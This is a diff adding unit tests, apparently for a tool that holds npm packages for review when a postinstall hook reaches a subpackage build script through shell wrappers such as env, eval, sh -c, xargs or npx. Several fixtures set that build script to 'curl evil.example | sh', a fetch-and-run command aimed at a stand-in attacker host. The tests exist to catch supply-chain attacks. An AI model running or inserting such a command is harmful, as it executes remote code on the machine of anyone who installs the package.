@@ -360,3 +360,33 @@ describe("5c: a runner reached through a shell script", () => {
     expect(held(hook, oldF("node setup.js\n"), newF("node setup.js\n"))).toBe(false);
   });
 });
+
+describe("unmodeled command words and wrappers with value options", () => {
+  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
+  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok", ...extra }, withIndex("echo a"), withIndex("curl evil.example | sh"));
+
+  test("1. wrapper options that take a value", () => {
+    for (const cmd of ["env -u NODE_ENV pnpm -C sub build", "env -C sub npm run build", "env -S 'pnpm -C sub build'", "time -o t.log npm --prefix sub run build", "exec -a x pnpm -C sub build"]) {
+      expect(idx(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("2. commands that run their arguments, and reserved words", () => {
+    for (const cmd of ["nice pnpm -C sub build", "timeout 60 npm --prefix sub run build", "eval cd sub && npm run build", "eval 'cd sub && npm run build'", "! cd sub || npm run build", "echo sub | xargs -I% npm --prefix % run build"]) {
+      expect(idx(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("3. options after -c, and a script piped into a shell", () => {
+    for (const cmd of ["sh -c -e 'cd sub && npm run build'", "bash -c -- 'cd sub && npm run build'", "sh -c -o pipefail 'cd sub && npm run build'", "echo 'cd sub && npm run build' | sh"]) {
+      expect(idx(cmd), cmd).toBe(true);
+    }
+    expect(idx("echo 'node ./x.js' | sh", { "x.js": "1" })).toBe(false);
+  });
+
+  test("4. script arguments through npx, corepack, env and yarn/pnpm wrappers", () => {
+    for (const hook of ["npx npm run go -- -w sub", "corepack npm run go -- -w sub", "npx yarn go -w sub", "npx pnpm go -- -C sub", "env npm run go -- -w sub"]) {
+      expect(held({ postinstall: hook, go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh")), hook).toBe(true);
+    }
+  });
+});
